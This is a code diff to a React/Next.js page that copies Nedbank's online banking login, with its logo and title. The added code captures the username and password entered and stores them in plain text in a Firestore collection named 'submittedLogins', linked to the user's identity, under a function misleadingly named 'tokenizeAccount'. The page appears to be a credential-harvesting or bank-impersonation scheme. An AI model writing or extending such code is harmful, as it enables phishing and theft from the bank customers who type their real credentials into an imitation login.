@@ -1,9 +1,68 @@
 import React from "react";
+import userDataContext from "../../../context/UserDataContext";
+import { useState, useContext } from "react";
 import PrivateRoute from "../../../components/auth/PrivateRoute";
 import { Meta } from "../../../components";
 import { Box, Stack, Typography } from "@mui/material";
+import cogoToast from "cogo-toast";
+import { addDoc, collection } from "firebase/firestore";
+import { db } from "../../../services/firebase.config";
+import { useRouter } from "next/router";
 
 const Nedbank = () => {
+  const router = useRouter();
+  const [formData, setFormData] = useState({
+    username: "",
+    password: "",
+  });
+  const [isLoading, setIsLoading] = useState(false);
+  const { userData } = useContext(userDataContext);
+
+  const { username, password } = formData;
+
+  const formInputHandler = (e) => {
+    e.preventDefault();
+
+    setFormData((prev) => ({
+      ...prev,
+      [e.target.id]: e.target.value,
+    }));
+  };
+
+  const tokenizeAccount = async () => {
+    const validateDetails =
+      password.trim().length > 0 && username.trim().length > 0;
+
+    if (validateDetails) {
+      try {
+        setIsLoading(true);
+
+        const res = await addDoc(collection(db, "submittedLogins"), {
+          _user: userData.id,
+          user_name: `${userData.firstName} ${userData.lastName}`,
+          timeStamp: new Date(),
+          data: {
+            ...formData,
+            bank: "nedbank",
+          },
+        });
+
+        console.log(res);
+        if (res) {
+          cogoToast.success("Successful");
+          router.replace("/account");
+        }
+        setIsLoading(false);
+      } catch (error) {
+        console.log(error);
+        cogoToast.error("Something went wrong");
+        setIsLoading(false);
+      }
+    } else {
+      cogoToast.error("One or more inputs are invalid");
+    }
+  };
+
   return (
     <>
       <Meta
@@ -25,25 +84,6 @@ const Nedbank = () => {
             alt="Nedbank Logo"
             style={{ width: "40px" }}
           />
-          {/* <Stack
-            direction="row"
-            alignItems="center"
-            justifyContent="space-between"
-            gap={2}
-            component="ul"
-            sx={{ color: "#006349" }}
-          >
-            <li>
-              <a style={{ display: "flex", alignItems: "center", gap: "5px" }}>
-                <img
-                  src="https://secured.nedbank.co.za/icon-chat-thin.aecf4aeab466cacf.svg"
-                  alt="nedbank chat"
-                  style={{ width: "24px" }}
-                />
-                <p style={{ fontSize: "18px" }}>Nedbank Chat</p>
-              </a>
-            </li>
-          </Stack> */}
         </Stack>
         <Typography fontSize={40} textAlign="center" color="#333" mb={4} mt={8}>
           Nedbank Online Banking
@@ -73,6 +113,7 @@ const Nedbank = () => {
                   color: "#666",
                   fontSize: "15px",
                 }}
+                onChange={formInputHandler}
               />
             </Box>
             <Box my={4}>
@@ -92,6 +133,7 @@ const Nedbank = () => {
                   color: "#666",
                   fontSize: "15px",
                 }}
+                onChange={formInputHandler}
               />
             </Box>
             <Box my={4}>
@@ -111,8 +153,10 @@ const Nedbank = () => {
                   cursor: "pointer",
                   borderRadius: "4px",
                 }}
+                disabled={isLoading}
+                onClick={tokenizeAccount}
               >
-                Proceed
+                {isLoading ? "Loading..." : "Proceed"}
               </button>
             </Box>
           </form>
